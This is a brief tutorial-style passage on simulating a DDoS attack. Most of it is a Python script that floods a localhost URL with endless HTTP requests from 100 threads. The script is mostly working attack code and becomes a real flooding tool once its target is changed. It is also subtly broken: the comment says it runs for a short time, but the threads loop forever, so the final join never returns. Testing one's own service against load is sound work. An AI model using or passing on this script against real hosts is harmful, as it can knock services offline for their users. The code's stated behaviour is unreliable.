Simulating Attacks
DDoS Attack Simulation
Overwhelm the network with excessive requests to simulate a DDoS attack.
Code Example: DDoS Attack Script

import requests
import threading

# URL of the target server
url = "http://localhost:5000"

# Function to send a request
def send_request():
    while True:
        try:
            requests.get(url)
        except:
            pass

# Create multiple threads to simulate DDoS
threads = []
for _ in range(100):
    thread = threading.Thread(target=send_request)
    thread.start()
    threads.append(thread)

# Run for a short time
import time
time.sleep(10)
for thread in threads:
    thread.join()
